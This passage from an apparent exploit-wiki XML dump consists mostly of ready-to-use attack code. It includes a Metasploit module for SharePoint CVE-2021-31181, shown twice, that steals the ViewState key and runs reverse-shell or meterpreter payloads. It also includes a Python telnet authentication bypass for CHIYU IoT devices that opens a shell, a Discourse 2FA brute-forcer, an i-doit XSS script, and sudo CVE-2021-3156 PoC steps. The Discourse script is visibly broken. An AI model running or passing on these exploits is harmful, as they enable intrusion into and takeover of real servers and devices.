    'xsi' =&gt; 'http://www.w3.org/2001/XMLSchema-instance',
    'xsd' =&gt; 'http://www.w3.org/2001/XMLSchema'
  }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'Microsoft SharePoint Unsafe Control and ViewState RCE',
        'Description' =&gt; %q{
          The EditingPageParser.VerifyControlOnSafeList method fails to properly validate user supplied data. This
          can be leveraged by an attacker to leak sensitive information in rendered-preview content. This module will
          leak the ViewState validation key and then use it to sign a crafted object that will trigger code execution
          when deserialized.

          Tested against SharePoint 2019 and SharePoint 2016, both on Windows Server 2016.
        },
        'Author' =&gt; [
          'Unknown', # Reported to HP ZDI team, Vulnerability discovery
          'Spencer McIntyre', # Module
          'wvu' # Module
        ],
        'References' =&gt; [
          [ 'CVE', '2021-31181' ],
          [ 'ZDI', '21-573' ],
          [ 'URL', 'https://www.zerodayinitiative.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability' ]
        ],
        'DisclosureDate' =&gt; '2021-05-11',
        'License' =&gt; MSF_LICENSE,
        'Platform' =&gt; 'win',
        'Arch' =&gt; [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' =&gt; false,
        'Targets' =&gt; [
          [
            'Windows Command',
            {
              'Arch' =&gt; ARCH_CMD,
              'Type' =&gt; :win_cmd,
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'cmd/windows/powershell_reverse_tcp'
              }
            }
          ],
          [
            'Windows Dropper',
            {
              'Arch' =&gt; [ARCH_X86, ARCH_X64],
              'Type' =&gt; :win_dropper,
              'DefaultOptions' =&gt; {
                'CMDSTAGER::FLAVOR' =&gt; :psh_invokewebrequest,
                'PAYLOAD' =&gt; 'windows/x64/meterpreter_reverse_https'
              }
            }
          ],
          [
            'PowerShell Stager',
            {
              'Arch' =&gt; [ARCH_X86, ARCH_X64],
              'Type' =&gt; :psh_stager,
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'windows/x64/meterpreter/reverse_https'
              }
            }
          ]
        ],
        'DefaultTarget' =&gt; 2,
        'DefaultOptions' =&gt; {
          'DotNetGadgetChain' =&gt; :TypeConfuseDelegate
        },
        'Notes' =&gt; {
          'Stability' =&gt; [CRASH_SAFE],
          'Reliability' =&gt; [REPEATABLE_SESSION],
          'SideEffects' =&gt; [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('VALIDATION_KEY', [false, 'ViewState validation key']),
      OptString.new('COOKIE', [false, 'SharePoint cookie if you have one']),
      OptString.new('SP_LIST', [true, 'SharePoint site SPList', 'Documents']),
      # "Promote" these advanced options so we don't have to pass around our own
      OptString.new('HttpUsername', [false, 'SharePoint username']),
      OptString.new('HttpPassword', [false, 'SharePoint password'])
    ])
  end

  def post_auth?
    true
  end

  def username
    datastore['HttpUsername']
  end

  def password
    datastore['HttpPassword']
  end

  def cookie
    datastore['COOKIE']
  end

  def vuln_builds
    # https://docs.microsoft.com/en-us/officeupdates/sharepoint-updates
    # https://buildnumbers.wordpress.com/sharepoint/
    # Patched in May of 2021
    [
      [Rex::Version.new('15.0.0.0'), Rex::Version.new('15.0.0.5337')], # SharePoint 2013
      [Rex::Version.new('16.0.0.0'), Rex::Version.new('16.0.0.5149')], # SharePoint 2016
      [Rex::Version.new('16.0.0.10000'), Rex::Version.new('16.0.0.10373')] # SharePoint 2019
    ]
  end

  def check
    build = sharepoint_get_version('cookie' =&gt; cookie)

    if build.nil?
      return CheckCode::Unknown('Failed to retrieve the SharePoint version number')
    end

    if vuln_builds.any? { |build_range| build.between?(*build_range) }
      return CheckCode::Appears("SharePoint #{build} is a vulnerable build.")
    end

    CheckCode::Safe("SharePoint #{build} is not a vulnerable build.")
  end

  def exploit
    if (username.blank? &amp;&amp; password.blank?)
      if cookie.blank?
        fail_with(Failure::BadConfig, 'HttpUsername and HttpPassword or COOKIE are required for exploitation')
      end

      print_warning('Using the specified COOKIE for authentication')
    end

    if (@validation_key = datastore['VALIDATION_KEY'])
      print_status("Using ViewState validation key #{@validation_key}")
    else
      leak_web_config
    end

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")

    case target['Type']
    when :win_cmd
      execute_command(payload.encoded)
    when :win_dropper
      execute_cmdstager
    when :psh_stager
      execute_command(cmd_psh_payload(
        payload.encoded,
        payload.arch.first,
        remove_comspec: true
      ))
    end
  end

  def leak_web_config
    print_status('Leaking the ViewState validation key...')

    web_id = sharepoint_get_site_web_id('cookie' =&gt; cookie)
    fail_with(Failure::UnexpectedReply, 'Failed to retrieve the site web ID') unless web_id

    webpart = &lt;&lt;~WEBPART
      &lt;%@ Register TagPrefix="WebPartPages" Namespace="Microsoft.SharePoint.WebPartPage" Assembly="Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" %&gt;
      &lt;%@ Register TagPrefix="att" Namespace="System.Web.UI.WebControls " Assembly="System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" %&gt;
    WEBPART
    webpart &lt;&lt; Nokogiri::XML(&lt;&lt;-WEBPART, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
      &lt;WebPartPages:XsltListFormWebPart id="id01" runat="server" ListDisplayName="#{datastore['SP_LIST'].encode(xml: :text)}" WebId="{#{web_id.encode(xml: :text)}}"&gt;
        &lt;DataSources&gt;
          &lt;att:xmldatasource runat="server" id="XDS1"
            XPath="/configuration/system.web/machineKey"
            datafile="c:/inetpub/wwwroot/wss/VirtualDirectories/80/web.config" /&gt;
        &lt;/DataSources&gt;
        &lt;xsl&gt;
            &lt;xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
                &lt;xsl:output method="xml" indent="yes" /&gt;
                &lt;xsl:template match="/"&gt;
                    &lt;xsl:copy-of select="." /&gt;
                &lt;/xsl:template&gt;
            &lt;/xsl:stylesheet&gt;
        &lt;/xsl&gt;
      &lt;/WebPartPages:XsltListFormWebPart&gt;
    WEBPART

    envelope = '&lt;?xml version="1.0" encoding="utf-8"?&gt;'
    envelope &lt;&lt; Nokogiri::XML(&lt;&lt;-ENVELOPE, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
      &lt;soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope"&gt;
        &lt;soap12:Body&gt;
          &lt;RenderWebPartForEdit xmlns="http://microsoft.com/sharepoint/webpartpages"&gt;
            &lt;webPartXml&gt;#{webpart.encode(xml: :text)}&lt;/webPartXml&gt;
          &lt;/RenderWebPartForEdit&gt;
        &lt;/soap12:Body&gt;
      &lt;/soap12:Envelope&gt;
    ENVELOPE

    res = send_request_cgi(
      'method' =&gt; 'POST',
      'uri' =&gt; normalize_uri(target_uri.path, '_vti_bin', 'WebPartPages.asmx'),
      'cookie' =&gt; cookie,
      'ctype' =&gt; 'application/soap+xml; charset=utf-8',
      'data' =&gt; envelope
    )

    unless res
      fail_with(Failure::Unreachable, "Target did not respond to #{__method__}")
    end

    unless res.code == 200
      fail_with(Failure::NotFound, "Failed to retrieve #{normalize_uri(target_uri.path, '_vti_bin', 'WebPartPages.asmx')}")
    end

    xml_response = res.get_xml_document
    if xml_response.nil?
      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (non-XML response body)')
    end

    xml_result = xml_response.xpath('//wpp:RenderWebPartForEditResult', XML_NS)&amp;.text
    unless xml_result
      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing xpath: //wpp:RenderWebPartForEditResult)')
    end

    xml_result = Nokogiri::XML(xml_result)
    web_part_pages = Nokogiri::XML(xml_result.xpath('//Properties').text)
    unless web_part_pages&amp;.root
      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing xpath: //Properties)')
    end

    unless (preview = web_part_pages.root.attr('__designer:Preview'))
      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing attribute: __desiginer:Preview)')
    end
    preview = Nokogiri::HTML(CGI.unescapeHTML(preview))
    unless (@validation_key = preview.at('//machinekey/@validationkey')&amp;.text)
      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing xpath: //machinekey/@validationkey)')
    end

    print_good("ViewState validation key: #{@validation_key}")
  end

  def execute_command(cmd, _opts = {})
    sharepoint_execute_command_via_viewstate(cmd, @validation_key, { 'cookie' =&gt; cookie })
  end
end
&lt;/pre&gt;</text>
      <sha1>7qgz3mwa6r2bxk1sheafyjd53gl8ncq</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31181 Microsoft SharePoint Unsafe Control And ViewState 遠程代碼執行漏洞/zh-cn</title>
    <ns>0</ns>
    <id>4690</id>
    <revision>
      <id>5392</id>
      <timestamp>2021-06-20T02:06:19Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影响版本=="</comment>
      <origin>5392</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="9861" sha1="5695me1alrct79au3so3zqs4wvcu8m4" xml:space="preserve">&lt;languages /&gt;
==影响版本==
Tested against SharePoint 2019 and SharePoint 2016, both on Windows Server 2016.

==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Sharepoint
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell

  XML_NS = {
    'wpp' =&gt; 'http://microsoft.com/sharepoint/webpartpages',
    'soap' =&gt; 'http://www.w3.org/2003/05/soap-envelope',
    'xsi' =&gt; 'http://www.w3.org/2001/XMLSchema-instance',
    'xsd' =&gt; 'http://www.w3.org/2001/XMLSchema'
  }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'Microsoft SharePoint Unsafe Control and ViewState RCE',
        'Description' =&gt; %q{
          The EditingPageParser.VerifyControlOnSafeList method fails to properly validate user supplied data. This
          can be leveraged by an attacker to leak sensitive information in rendered-preview content. This module will
          leak the ViewState validation key and then use it to sign a crafted object that will trigger code execution
          when deserialized.

          Tested against SharePoint 2019 and SharePoint 2016, both on Windows Server 2016.
        },
        'Author' =&gt; [
          'Unknown', # Reported to HP ZDI team, Vulnerability discovery
          'Spencer McIntyre', # Module
          'wvu' # Module
        ],
        'References' =&gt; [
          [ 'CVE', '2021-31181' ],
          [ 'ZDI', '21-573' ],
          [ 'URL', 'https://www.zerodayinitiative.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability' ]
        ],
        'DisclosureDate' =&gt; '2021-05-11',
        'License' =&gt; MSF_LICENSE,
        'Platform' =&gt; 'win',
        'Arch' =&gt; [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' =&gt; false,
        'Targets' =&gt; [
          [
            'Windows Command',
            {
              'Arch' =&gt; ARCH_CMD,
              'Type' =&gt; :win_cmd,
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'cmd/windows/powershell_reverse_tcp'
              }
            }
          ],
          [
            'Windows Dropper',
            {
              'Arch' =&gt; [ARCH_X86, ARCH_X64],
              'Type' =&gt; :win_dropper,
              'DefaultOptions' =&gt; {
                'CMDSTAGER::FLAVOR' =&gt; :psh_invokewebrequest,
                'PAYLOAD' =&gt; 'windows/x64/meterpreter_reverse_https'
              }
            }
          ],
          [
            'PowerShell Stager',
            {
              'Arch' =&gt; [ARCH_X86, ARCH_X64],
              'Type' =&gt; :psh_stager,
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'windows/x64/meterpreter/reverse_https'
              }
            }
          ]
        ],
        'DefaultTarget' =&gt; 2,
        'DefaultOptions' =&gt; {
          'DotNetGadgetChain' =&gt; :TypeConfuseDelegate
        },
        'Notes' =&gt; {
          'Stability' =&gt; [CRASH_SAFE],
          'Reliability' =&gt; [REPEATABLE_SESSION],
          'SideEffects' =&gt; [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('VALIDATION_KEY', [false, 'ViewState validation key']),
      OptString.new('COOKIE', [false, 'SharePoint cookie if you have one']),
      OptString.new('SP_LIST', [true, 'SharePoint site SPList', 'Documents']),
      # "Promote" these advanced options so we don't have to pass around our own
      OptString.new('HttpUsername', [false, 'SharePoint username']),
      OptString.new('HttpPassword', [false, 'SharePoint password'])
    ])
  end

  def post_auth?
    true
  end

  def username
    datastore['HttpUsername']
  end

  def password
    datastore['HttpPassword']
  end

  def cookie
    datastore['COOKIE']
  end

  def vuln_builds
    # https://docs.microsoft.com/en-us/officeupdates/sharepoint-updates
    # https://buildnumbers.wordpress.com/sharepoint/
    # Patched in May of 2021
    [
      [Rex::Version.new('15.0.0.0'), Rex::Version.new('15.0.0.5337')], # SharePoint 2013
      [Rex::Version.new('16.0.0.0'), Rex::Version.new('16.0.0.5149')], # SharePoint 2016
      [Rex::Version.new('16.0.0.10000'), Rex::Version.new('16.0.0.10373')] # SharePoint 2019
    ]
  end

  def check
    build = sharepoint_get_version('cookie' =&gt; cookie)

    if build.nil?
      return CheckCode::Unknown('Failed to retrieve the SharePoint version number')
    end

    if vuln_builds.any? { |build_range| build.between?(*build_range) }
      return CheckCode::Appears("SharePoint #{build} is a vulnerable build.")
    end

    CheckCode::Safe("SharePoint #{build} is not a vulnerable build.")
  end

  def exploit
    if (username.blank? &amp;&amp; password.blank?)
      if cookie.blank?
        fail_with(Failure::BadConfig, 'HttpUsername and HttpPassword or COOKIE are required for exploitation')
      end

      print_warning('Using the specified COOKIE for authentication')
    end

    if (@validation_key = datastore['VALIDATION_KEY'])
      print_status("Using ViewState validation key #{@validation_key}")
    else
      leak_web_config
    end

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")

    case target['Type']
    when :win_cmd
      execute_command(payload.encoded)
    when :win_dropper
      execute_cmdstager
    when :psh_stager
      execute_command(cmd_psh_payload(
        payload.encoded,
        payload.arch.first,
        remove_comspec: true
      ))
    end
  end

  def leak_web_config
    print_status('Leaking the ViewState validation key...')

    web_id = sharepoint_get_site_web_id('cookie' =&gt; cookie)
    fail_with(Failure::UnexpectedReply, 'Failed to retrieve the site web ID') unless web_id

    webpart = &lt;&lt;~WEBPART
      &lt;%@ Register TagPrefix="WebPartPages" Namespace="Microsoft.SharePoint.WebPartPage" Assembly="Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" %&gt;
      &lt;%@ Register TagPrefix="att" Namespace="System.Web.UI.WebControls " Assembly="System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" %&gt;
    WEBPART
    webpart &lt;&lt; Nokogiri::XML(&lt;&lt;-WEBPART, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
      &lt;WebPartPages:XsltListFormWebPart id="id01" runat="server" ListDisplayName="#{datastore['SP_LIST'].encode(xml: :text)}" WebId="{#{web_id.encode(xml: :text)}}"&gt;
        &lt;DataSources&gt;
          &lt;att:xmldatasource runat="server" id="XDS1"
            XPath="/configuration/system.web/machineKey"
            datafile="c:/inetpub/wwwroot/wss/VirtualDirectories/80/web.config" /&gt;
        &lt;/DataSources&gt;
        &lt;xsl&gt;
            &lt;xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
                &lt;xsl:output method="xml" indent="yes" /&gt;
                &lt;xsl:template match="/"&gt;
                    &lt;xsl:copy-of select="." /&gt;
                &lt;/xsl:template&gt;
            &lt;/xsl:stylesheet&gt;
        &lt;/xsl&gt;
      &lt;/WebPartPages:XsltListFormWebPart&gt;
    WEBPART

    envelope = '&lt;?xml version="1.0" encoding="utf-8"?&gt;'
    envelope &lt;&lt; Nokogiri::XML(&lt;&lt;-ENVELOPE, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
      &lt;soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope"&gt;
        &lt;soap12:Body&gt;
          &lt;RenderWebPartForEdit xmlns="http://microsoft.com/sharepoint/webpartpages"&gt;
            &lt;webPartXml&gt;#{webpart.encode(xml: :text)}&lt;/webPartXml&gt;
          &lt;/RenderWebPartForEdit&gt;
        &lt;/soap12:Body&gt;
      &lt;/soap12:Envelope&gt;
    ENVELOPE

    res = send_request_cgi(
      'method' =&gt; 'POST',
      'uri' =&gt; normalize_uri(target_uri.path, '_vti_bin', 'WebPartPages.asmx'),
      'cookie' =&gt; cookie,
      'ctype' =&gt; 'application/soap+xml; charset=utf-8',
      'data' =&gt; envelope
    )

    unless res
      fail_with(Failure::Unreachable, "Target did not respond to #{__method__}")
    end

    unless res.code == 200
      fail_with(Failure::NotFound, "Failed to retrieve #{normalize_uri(target_uri.path, '_vti_bin', 'WebPartPages.asmx')}")
    end

    xml_response = res.get_xml_document
    if xml_response.nil?
      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (non-XML response body)')
    end

    xml_result = xml_response.xpath('//wpp:RenderWebPartForEditResult', XML_NS)&amp;.text
    unless xml_result
      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing xpath: //wpp:RenderWebPartForEditResult)')
    end

    xml_result = Nokogiri::XML(xml_result)
    web_part_pages = Nokogiri::XML(xml_result.xpath('//Properties').text)
    unless web_part_pages&amp;.root
      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing xpath: //Properties)')
    end

    unless (preview = web_part_pages.root.attr('__designer:Preview'))
      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing attribute: __desiginer:Preview)')
    end
    preview = Nokogiri::HTML(CGI.unescapeHTML(preview))
    unless (@validation_key = preview.at('//machinekey/@validationkey')&amp;.text)
      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing xpath: //machinekey/@validationkey)')
    end

    print_good("ViewState validation key: #{@validation_key}")
  end

  def execute_command(cmd, _opts = {})
    sharepoint_execute_command_via_viewstate(cmd, @validation_key, { 'cookie' =&gt; cookie })
  end
end
&lt;/pre&gt;</text>
      <sha1>5695me1alrct79au3so3zqs4wvcu8m4</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31251 CHIYU IoT Devices - 'Telnet' 身份驗證繞過漏洞</title>
    <ns>0</ns>
    <id>3356</id>
    <revision>
      <id>3920</id>
      <timestamp>2021-06-03T11:57:39Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: CHIYU IoT Devices - 'Telnet' Authentication Bypass # Date: 01/06/2021 # Exploit Author: sirpedrotavares # Vendor Homepage: https://www.chiyu-tec..."</comment>
      <origin>3920</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3094" sha1="hbqwi9k2vkkfgacpcptp84iabk2873d" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: CHIYU IoT Devices - 'Telnet' Authentication Bypass
# Date: 01/06/2021
# Exploit Author: sirpedrotavares
# Vendor Homepage: https://www.chiyu-tech.com/msg/msg88.html
# Software Link: https://www.chiyu-tech.com/category-hardware.html
# Version:  BF-430, BF-431, BF-450M, and SEMAC   - all firmware versions &lt; June 2021
# Tested on:  BF-430, BF-431, BF-450M, and SEMAC
# CVE: CVE-2021-31251
# Publication: https://seguranca-informatica.pt/dancing-in-the-iot-chiyu-devices-vulnerable-to-remote-attacks

"""
Description: Several IoT devices from the CHIYU Technology firm are
vulnerable to a flaw that permits bypassing the telnet authentication
process due to an overflow during the negotiation of the telnet protocol.
Telnet authentication is bypassed by supplying a specially malformed
request, and an attacker may force the remote telnet server to believe that
the user has already authenticated. Several models are vulnerable,
including BF-430, BF-431, BF-450M, and SEMAC with the most recent firmware
versions.
CVE ID: CVE-2021-31251
CVSS: Critical - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
URL: https://gitbook.seguranca-informatica.pt/cve-and-exploits/cves/chiyu-iot-devices#cve-2021-31251
"""

#!/usr/bin/env python3

# usage: python3 exploit.py IP

import socket
import time
import sys

HOST = sys.argv[1]
PORT = 23

socket.setdefaulttimeout(10)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    connect = s.connect_ex((HOST, PORT))
    try:
        print("[+] Try to connect...\n")
        time.sleep(1)
        s.send(b"\xff\xfb\x01\xff\xfb\x03\xff\xfd\x18")
        s.recv(1024).strip()
        s.send(b"\xff\xfb\x01\xff\xfb\x03\xff\xfd\x18")
        s.recv(1024).strip()
        s.send(b"\xff\xfb\x01\xff\xfb\x03\xff\xfd\x18")
        result = s.recv(1024).strip()
        if result != b'\xff\xfe\x01':
            s.send(b"\x09")
            result = s.recv(1024).strip()

        if connect == 0 and "sername" not in str(result):
            if b"\xff\xfe\x01" == result:
                print("Connected! ;)\ntype: \"help\"\n\n")
                while 1:
                        cmd = input("(CHIYU pwnShell:) $ ")
                        body = cmd+"\n"
                        s.send(body.encode('utf-8', 'ignore'))
                        result = s.recv(1024).decode('utf8', 'ignore')

                        if not len(result):
                            print("[+] CHIYU device not available, try
again ... (terminating)")
                            s.close()
                            break
                        print(result.strip('CMD&gt;'))
                        b = "\n"
                        s.send(b.encode('utf-8', 'ignore'))
                        result = s.recv(1024).decode()
                        print(result.strip('CMD&gt;'))
    except KeyboardInterrupt:
        print("\n[+] ^C Received, closing connection")
        s.close()
    except EOFError:
        print("\n[+] ^D Received, closing connection")
        s.close()

except socket.error:
    print("[+] Unable to connect to CHIYU device.")
&lt;/pre&gt;</text>
      <sha1>hbqwi9k2vkkfgacpcptp84iabk2873d</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-3138 Discourse 2.7.0 2FA繞過漏洞</title>
    <ns>0</ns>
    <id>1470</id>
    <revision>
      <id>1847</id>
      <timestamp>2021-04-21T10:06:46Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Discourse 2.7.0 - Rate Limit Bypass leads to 2FA Bypass # Date: 14/01/2021 # Exploit Author: Mesh3l_911 # Vendor Homepage: https://www.discourse..."</comment>
      <origin>1847</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2296" sha1="dy9eotq8nxk9fagvcuctnaf324cqytu" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Discourse 2.7.0 - Rate Limit Bypass leads to 2FA Bypass
# Date: 14/01/2021
# Exploit Author: Mesh3l_911
# Vendor Homepage: https://www.discourse.org/
# Software Link:https://github.com/discourse/discourse
# Version: Discourse 2.7.0
# CVE: CVE-2021-3138

import requests

username = input("\n input ur username : ")
password = input("\n input ur password : ")
session=requests.session()

proxies = []
def proxies():
    proxies_path = input("\n input ur proxies path : ")

    with open(proxies_path, 'r') as prox:
        for _ in prox.read().splitlines():
            proxies.append()

backup_codes = []
def backup_list():
    Backup_codes = input("\n input ur Backup_codes list path : ")

    with open(Backup_codes, 'r') as codes:
        for _ in codes.read().splitlines():
            backup_codes.append()

def exploit():
    with open('Backup_codes.txt', 'w') as results:
        try:
            for __ in proxies:
                for _ in codes.read().splitlines():
                    header =\
                    {
                        "X-CSRF-Token": "ur X-CSRF-Token",
                        "Cookie": "ur Cookie",
                        "X-Requested-With": "XMLHttpRequest"
                    }
                    body = {"login": username, "password": password, "second_factor_token": _, "second_factor_method": "2"}
                    request = session.post("ur target_url", headers=header, data=body, proxies={'http': __, 'https':__})
                    source = request.text
                    backup_codes.remove(_)

                    if request.status_code == 200:
                        if '"id"' in source:
                            results.write("The Backup_Coude is &gt; {} ".format(_))
                            return True
                        else:
                            pass
                    else:
                        proxies.remove(__)
                        break


        except requests.exceptions.SSLError and requests.exceptions.ConnectionError:
            print(" Connection Failed :( ")

        results.close()


def main():
    if exploit():
        print("\n Found :) \n")
    else:
        print("\n Please re-check ur inputs :( \n")
if __name__ == '__main__':
    main()
            
&lt;/pre&gt;</text>
      <sha1>dy9eotq8nxk9fagvcuctnaf324cqytu</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-3151 i-doit 1.15.2 XSS漏洞</title>
    <ns>0</ns>
    <id>3106</id>
    <revision>
      <id>3609</id>
      <timestamp>2021-05-29T01:16:51Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/python3 # Author: @nu11secur1ty # CVE-2021-3151  from selenium import webdriver import time import os, sys   # Vendor: https://www.i-doit.org/news/ we..."</comment>
      <origin>3609</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1617" sha1="2ulfnh3i687tfyfjw2ggl8yvcaluf0x" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/python3
# Author: @nu11secur1ty
# CVE-2021-3151

from selenium import webdriver
import time
import os, sys


# Vendor: https://www.i-doit.org/news/
website_link="http://192.168.1.160/?"

# enter your login username
username="admin"

# enter your login password
password="admin"

#enter the element for username input field
element_for_username="login_username"

#enter the element for password input field
element_for_password="login_password"

#enter the element for submit button
element_for_submit="login_submit"

#browser = webdriver.Safari() #for macOS users[for others use chrome vis
chromedriver]
browser = webdriver.Chrome() #uncomment this line,for chrome users
#browser = webdriver.Firefox() #uncomment this line,for chrome users

time.sleep(1)
browser.get((website_link))

try:
username_element = browser.find_element_by_name(element_for_username)
username_element.send_keys(username)
password_element  = browser.find_element_by_name(element_for_password)
password_element.send_keys(password)
signInButton = browser.find_element_by_name(element_for_submit)
signInButton.click()

# Exploit XSS vulnerability parameter viewMode
time.sleep(3)
# Payload Parameter: "viewMode" (Infrastructure &gt; catgID=41 == XSS
injection simbol{'})
browser.get(("
http://192.168.1.160/index.php?viewMode=1002&amp;tvMode=1006&amp;tvType=1&amp;objID=26&amp;catgID=41%27
"))

print("The payload is deployed now this is bad for the owner \;)\...\n")


except Exception:
#### This exception occurs if the element are not found in the webpage.
print("Sorry, but something is wrong and this exploit is not working...")
&lt;/pre&gt;</text>
      <sha1>2ulfnh3i687tfyfjw2ggl8yvcaluf0x</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-3156緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>62</id>
    <revision>
      <id>123</id>
      <timestamp>2021-03-01T06:05:41Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>建立內容為「==漏洞簡介== 在sudo解析命令行參數的方式中發現了基於堆的緩衝區溢出。任何本地用戶（普通用戶和系統用戶，sudoer和非sud…」的新頁面</comment>
      <origin>123</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1685" sha1="cy4jcmkak6lxvkd9yj6y989n3586cbr" xml:space="preserve">==漏洞簡介==
在sudo解析命令行參數的方式中發現了基於堆的緩衝區溢出。任何本地用戶（普通用戶和系統用戶，sudoer和非sudoers）都可以利用此漏洞，而無需進行身份驗證，攻擊者不需要知道用戶的密碼。成功利用此漏洞可以獲得root權限。

用戶可以使用如下方法進行自查：以非root用戶登錄系統，並使用命令&lt;code&gt;sudoedit -s / &lt;/code&gt;

如果響應一個以&lt;code&gt;sudoedit:&lt;/code&gt;開頭的報錯，那麼表明存在漏洞。
如果響應一個以&lt;code&gt;usage:&lt;/code&gt;開頭的報錯，那麼表明補丁已經生效。

==漏洞測試成功的Linux發行版==
&lt;pre&gt;
Ubuntu 16.04.5 kernel 4.15.0-29-generic 

Ubuntu 18.04.1 kernel 4.15.0-20-generic 

Ubuntu 19.04 kernel 5.0.0-15-generic 

Ubuntu Mate 18.04.2 kernel 4.18.0-15-generic 

Linux Mint 19 kernel 4.15.0-20-generic 

Xubuntu 16.04.4 kernel 4.13.0-36-generic 

ElementaryOS 0.4.1 4.8.0-52-generic 

Backbox 6 kernel 4.18.0-21-generic 

Parrot OS 4.5.1 kernel 4.19.0- 

parrot1-13t-amd64 Kali kernel 4.19.0-

kali5-amd64 

Redcore 1806 (LXQT) kernel 4.16.16- 

redcoreMX 18.3 kernel 4.19.37-2~mx17+1 

RHEL 8.0 kernel 4.18.0-80.el8.x86_64 

Debian 9.4.0 kernel 4.9.0-6-amd64 

Debian 10.0.0 kernel 4.19.0-5-amd64 

Devuan 2.0.0 kernel 4.9.0-6-amd64 

SparkyLinux 5.8 kernel 4.19.0-5-amd64 

Fedora Workstation 30 kernel 5.0.9-301.fc30.x86_64 

Manjaro 18.0.3 kernel 4.19.23-1- 

MANJAROMageia 6 kernel 4.9.35-desktop-1.mga6 

Antergos 18.7 kernel 4.17.6-1-ARCH
&lt;/pre&gt;


==POC==
https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz


&lt;pre&gt;
cd CVE-2021-3156

make

./sudo-hax-me-a-sandwich
&lt;/pre&gt;

可發現成功獲得ROOT權限。</text>
      <sha1>cy4jcmkak6lxvkd9yj6y989n3586cbr</sha1>
    </revision>
    <revision>
      <id>3652</id>
